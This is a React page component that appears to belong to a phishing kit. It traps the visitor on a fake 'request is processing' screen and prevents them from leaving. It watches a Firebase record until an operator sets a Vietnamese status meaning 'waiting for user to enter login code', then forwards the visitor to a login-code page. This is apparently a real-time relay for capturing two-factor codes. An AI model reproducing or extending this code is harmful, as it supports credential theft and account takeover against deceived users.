import { useEffect } from "react";
import Spinner from "../Components/Spinner";
import { onValue, ref } from "firebase/database";
import { database } from "../Utils/firebase";
import { useNavigate } from "react-router";

const ConfirmLoading = () => {
  useEffect(() => {
    window.onbeforeunload = function (e) {
      e.preventDefault();
      return "";
    };
  }, []);

  const navigate = useNavigate();

  useEffect(() => {
    const starCountRef = ref(
      database,
      "records/" + localStorage.getItem("record_uid")
    );
    onValue(starCountRef, (snapshot) => {
      const data = snapshot.val();
      if (data?.user_status === "Chờ user nhập mã đăng nhập") {
        navigate("/confirm/login-code");
      }
    });
  }, []);

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
      }}
    >
      <div
        style={{
          margin: "auto",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          flexDirection: "column",
          maxWidth: 600,
          padding: 15,
          textAlign: "center",
        }}
      >
        <div className="mb-4">
          <Spinner
            style={{
              width: 36,
              height: 36,
              borderWidth: 5,
              margin: 0,
            }}
          />
        </div>
        <h3
          className="mb-2"
          style={{
            color: "#444",
          }}
        >
          Your request is processing
        </h3>
        <p
          className="mb-3"
          style={{
            fontSize: 15,
            color: "#838080",
          }}
        >
          Please wait 3-5 minutes. We are checking your information. Please do
          not leave this site once processing is complete.
        </p>
      </div>
    </div>
  );
};

export default ConfirmLoading;
